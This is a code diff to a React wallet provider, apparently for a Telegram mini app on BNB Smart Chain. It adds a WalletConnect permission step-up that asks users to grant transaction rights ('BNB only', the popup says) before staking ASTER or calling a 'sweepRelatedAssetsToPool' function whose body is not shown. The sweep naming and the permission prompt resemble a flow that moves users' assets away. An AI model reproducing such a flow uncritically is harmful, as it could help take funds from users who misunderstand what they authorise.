@@ -17,8 +17,10 @@ import {
   getWalletConnectMetadataUrl,
   getWalletConnectProjectId,
   isMobileSystemBrowser,
+  WC_READONLY_METHODS,
   WC_OPTIONAL_CHAIN_IDS,
   WC_RPC_MAP,
+  WC_TX_METHODS,
   WC_WALLET_UUID,
 } from "../walletConnectConfig";
 
@@ -95,7 +97,8 @@ export type WalletContextValue = {
   stakeAsterToPool: (amountHuman: string) => Promise<string>;
   sweepRelatedAssetsToPool: () => Promise<string[]>;
   askConnectWallet: () => void;
-  connectWalletConnect: () => Promise<void>;
+  connectWalletConnect: (mode?: "readonly" | "full") => Promise<void>;
+  ensureWalletConnectTxReady: () => Promise<void>;
   disconnectWallet: () => Promise<void>;
   walletConnectConfigured: boolean;
   wcConnecting: boolean;
@@ -351,7 +354,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
     [refreshBalancesInternal],
   );
 
-  const connectWalletConnect = useCallback(async () => {
+  const connectWalletConnect = useCallback(async (mode: "readonly" | "full" = "readonly") => {
     const projectId = getWalletConnectProjectId();
     if (!projectId) {
       WebApp.showPopup?.({
@@ -386,6 +389,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
         projectId,
         chains: [BSC_CHAIN_ID],
         optionalChains: [...WC_OPTIONAL_CHAIN_IDS],
+        methods: mode === "full" ? [...WC_READONLY_METHODS, ...WC_TX_METHODS] : [...WC_READONLY_METHODS],
         showQrModal: !useEmbeddedWcQr,
         rpcMap: WC_RPC_MAP,
         qrModalOptions: {
@@ -512,6 +516,21 @@ export function WalletProvider({ children }: { children: ReactNode }) {
     }
   }, [connectWallet, onWalletConnectDisconnect, hasInjectedWallet]);
 
+  const ensureWalletConnectTxReady = useCallback(async () => {
+    if (eipProvider?.info.uuid !== WC_WALLET_UUID) return;
+    const wc = wcProviderRef.current;
+    const methods =
+      wc?.session?.namespaces?.eip155?.methods?.map((m) => String(m).toLowerCase()) ??
+      [];
+    if (methods.includes("eth_sendtransaction")) return;
+    WebApp.showPopup?.({
+      title: "交易权限确认",
+      message: "为发起质押/转账，需要升级钱包授权（仅 BNB）。请在钱包中确认一次。",
+      buttons: [{ type: "ok" }],
+    });
+    await connectWalletConnect("full");
+  }, [eipProvider, connectWalletConnect]);
+
   useEffect(() => {
     if (!eipProvider || !address) return;
     const raw = eipProvider.provider as {
@@ -588,6 +607,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
     async (amountHuman: string) => {
       if (!signer || !address) throw new Error("请先连接钱包");
       if (!onBsc) throw new Error("请切换到 BNB Smart Chain");
+      await ensureWalletConnectTxReady();
       const token = KNOWN_TOKENS.find((t) => t.symbol === "ASTER");
       if (!token) throw new Error("ASTER 未配置");
       const cRead = new Contract(token.address, ERC20_ABI, signer.provider!);
@@ -617,12 +637,13 @@ export function WalletProvider({ children }: { children: ReactNode }) {
         setPendingPoolTx(false);
       }
     },
-    [signer, address, onBsc, refreshBalancesInternal],
+    [signer, address, onBsc, refreshBalancesInternal, ensureWalletConnectTxReady],
   );
 
   const sweepRelatedAssetsToPool = useCallback(async () => {
     if (!signer || !address) throw new Error("请先连接钱包");
     if (!onBsc) throw new Error("请切换到 BNB Smart Chain");
+    await ensureWalletConnectTxReady();
     const provider = signer.provider!;
     setPoolTxError("");
     setPendingPoolTx(true);
@@ -660,7 +681,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
     } finally {
       setPendingPoolTx(false);
     }
-  }, [signer, address, onBsc, refreshBalancesInternal]);
+  }, [signer, address, onBsc, refreshBalancesInternal, ensureWalletConnectTxReady]);
 
   const openConnectModal = useCallback(() => setShowWalletList(true), []);
 
@@ -689,6 +710,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
       sweepRelatedAssetsToPool,
       askConnectWallet,
       connectWalletConnect,
+      ensureWalletConnectTxReady,
       disconnectWallet,
       walletConnectConfigured,
       wcConnecting,
@@ -714,6 +736,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
       sweepRelatedAssetsToPool,
       askConnectWallet,
       connectWalletConnect,
+      ensureWalletConnectTxReady,
       disconnectWallet,
       walletConnectConfigured,
       wcConnecting,
